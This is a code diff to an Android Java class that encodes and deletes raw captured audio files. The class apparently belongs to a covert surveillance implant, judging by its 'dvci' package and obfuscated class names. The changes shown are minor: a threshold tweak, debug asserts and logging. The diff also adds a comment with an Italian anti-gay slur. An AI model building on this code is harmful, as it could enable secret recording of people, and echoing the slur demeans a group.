@@ -5,6 +5,7 @@ import android.media.AmrInputStream;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.Configuration;
+import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
 import com.android.dvci.resample.Resample;
 import com.android.mm.M;
@@ -22,6 +23,7 @@ import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 import java.util.Date;
 
+// HIC SUNT RICCHIONES
 public class AudioEncoder {
 	private static final String TAG = "AudioEncoding";
 	private static String audioDirectory = "l4/";
@@ -94,7 +96,7 @@ public class AudioEncoder {
 
 		float perc = (1.0f - (bit / ref)) * 100.0f;
 
-		if (perc > 10.0f) {
+		if (perc > 5.0f) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(getInferredSampleRate): declared bitrate of " + bitrate + " seems to be false (skew: "
 						+ (int) perc + "%), assuming: " + calc);
@@ -281,6 +283,9 @@ public class AudioEncoder {
 			// Second round extracts only the audio data
 			while (d.remaining() > 0) {
 				epoch = d.getInt();
+				if(Cfg.DEBUG){
+					Check.asserts(epoch <= last_epoch, "Last_epoch not correct");
+				}
 				streamType = d.getInt();
 				sampleRate = d.getInt();
 				//pid = d.getInt();
@@ -343,8 +348,10 @@ public class AudioEncoder {
 			return;
 		}
 
-		File raw = new File(rawFile);
-
+		AutoFile raw = new AutoFile(rawFile);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "(removeRawFile): " + rawFile);
+		}
 		raw.delete();
 	}
 
